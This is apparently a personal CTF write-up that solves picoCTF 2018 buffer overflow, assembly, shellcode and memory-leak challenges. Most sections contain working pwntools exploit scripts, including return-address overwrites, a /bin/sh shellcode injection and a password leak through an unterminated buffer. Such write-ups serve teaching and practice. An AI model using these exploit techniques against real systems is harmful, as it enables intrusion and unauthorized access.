---
title: 'picoCTF 2018: Pwn and Assembly Challenges'
date: 2018-09-28T00:00:00.000Z
excerpt: >-
  Solutions to picoCTF 2018 pwn and assembly challenges: a buffer overflow series, x86 assembly puzzles, and shellcode execution.
tags:
  - ctf
  - writeup
  - pwn
  - picoctf
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## Buffer Overflow 0 - 150 points

A challenge that tests understanding of buffer overflow by giving you the source code and binary.

The key is the `sigsegv_handler` function and the main input routine. `sigsegv_handler` is registered as the SIGSEGV signal handler - when a segmentation fault occurs, it prints the flag to stderr instead of a normal crash.

In other words, intentionally triggering an error prints the flag. Overflow the buffer to cause a segfault.

```bash
python -c 'print "A"*200' | ./vuln
```

---

## Buffer Overflow 1 - 200 points

The binary has a `vuln()` function that reads input with `gets()`, and a separate `win()` function that prints the flag. The goal is to overwrite `vuln`'s return address with `win`.

Download the binary locally and debug it to figure out the exact offset. Analyzing `vuln`'s stack structure:

```
buf[32] + padding[12] = 44 bytes -> reaches ret
```

Stack layout: `buffer[32] | saved regs[12] | ret[4]`

On my first attempt I tried Return-to-Library (RTL) without considering the `win()` function, and only realized my mistake later. After downloading the file from the server and debugging it, the gap to the ret address was slightly larger.

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

win = 0x080485cb

payload = ""
payload += "A" * 44
payload += p32(win)

p.sendline(payload)
p.interactive()
```

---

## Buffer Overflow 2 - 250 points

Same structure as Buffer Overflow 1, but the `win()` function needs two specific arguments to print the flag:

```c
void win(int arg1, int arg2) {
    if (arg1 == 0xDEADBEEF && arg2 == 0xDEADC0DE)
        // print flag
}
```

This is the Return-to-Library (RTL) technique. A program only loads the functions it needs at compile time and shares others at runtime. On x86-32, when calling a function by overwriting the return address, arguments are passed on the stack right after the fake return address.

Payload layout:

```
buffer[100] | dummy[12] | win_addr[4] | fake_ret[4] | arg1[4] | arg2[4]
```

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

win = 0x08048676

payload = ""
payload += "A" * 112
payload += p32(win)
payload += "AAAA"          # fake return address for win()
payload += p32(0xDEADBEEF) # arg1
payload += p32(0xDEADC0DE) # arg2

p.sendline(payload)
p.interactive()
```

---

## Assembly 0 - 150 points

A challenge that requires guessing the return value from assembly code.

Converting the assembly to C gives a simple register operation:

```c
int f(int a, int b) {
    return a + b; // or an equivalent operation
}
```

The flag is the decimal representation of the return value when the function is run with the given inputs.

---

## Assembly 1 - 200 points

The second assembly challenge. Just need to find the return value when 0x255 is given as input.

The assembly is a bit longer. Expressing the conditional branch as a `goto` and converting to C gives:

```c
int f(int x) {
    int result = 0;
    again:
        if (x <= 0) return result;
        result += x;
        x--;
        goto again;
}
```

This was the first time I'd used a `goto` statement while solving a challenge. Running with `x = 0x255 = 597`:

```python
x = 0x255
result = 0
while x > 0:
    result += x
    x -= 1
print(result)
```

Formatting the return value correctly gives the flag.

---

## Assembly 2 - 250 points

An exercise in manually tracing a more complex assembly snippet with several register and memory operations. The approach is the same: convert each instruction to C, track register state, and compute the final `eax` value.

---

## Assembly 3 - 400 points

The `al`/`ah` byte register operations are complex enough that tracing them purely by hand is difficult.

![Assembly-3 challenge assembly code](/images/writeups/picoctf-2018/assembly-3.png)

The intended approach: treat the provided assembly as shellcode, cast it to a function pointer, run it, and observe the return value directly.

```c
#include <stdio.h>
#include <string.h>

int main() {
    // assembly bytes given in the challenge
    char shellcode[] = "\x...";
    
    int (*fp)(int, int, int) = (int (*)(int, int, int))(void *)shellcode;
    printf("%d\n", fp(arg1, arg2, arg3));
    return 0;
}
```

Compile with `-z execstack` to allow stack execution, run it, and read the return value as the flag.

---

## Shellcode - 200 points

The binary reads input into a buffer with `gets()`, then executes that buffer as code:

```c
void vuln() {
    char buf[64];
    gets(buf);
    // execute buf as a function
    ((void(*)())buf)();
}
```

`((void(*)())buf)()` is a cast that makes the buffer directly executable - a classic shellcode injection. Since NX is disabled, shellcode placed in the buffer executes when the function pointer is invoked.

Standard Linux x86 `/bin/sh` shellcode works here:

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```

---

## Leak Me - 200 points

The binary reads a name with `fgets()` and removes the trailing newline by setting it to null. It then reads a password from a file and validates it against user input.

The vulnerability is in the null-byte removal logic. If the name buffer is filled to capacity, `fgets` places a null terminator at `name[255]`. But the code then does `name[strlen(name) - 1] = '\0'`, which strips that trailing null - leaving the name buffer without a terminator. Afterward, `puts(name)` reads past the buffer boundary into the adjacent `password` array.

Stack layout:

```
name[256] | password[64] | input_password[64]
```

Filling `name` completely (256 bytes) causes the null removal to leave the buffer unterminated, and `puts` prints straight through into the password stored right after it.

```python
from pwn import *

p = remote("2018shell2.picoctf.com", PORT)

# fill the name buffer completely to trigger the null removal bug
p.sendline("A" * 256)

# read the leaked output - the password sits right after the name in memory
output = p.recvline()
leaked_password = output[256:].split('\n')[0]
print("Leaked password:", leaked_password)

# submit the password normally
p.sendline(leaked_password)
p.interactive()
```
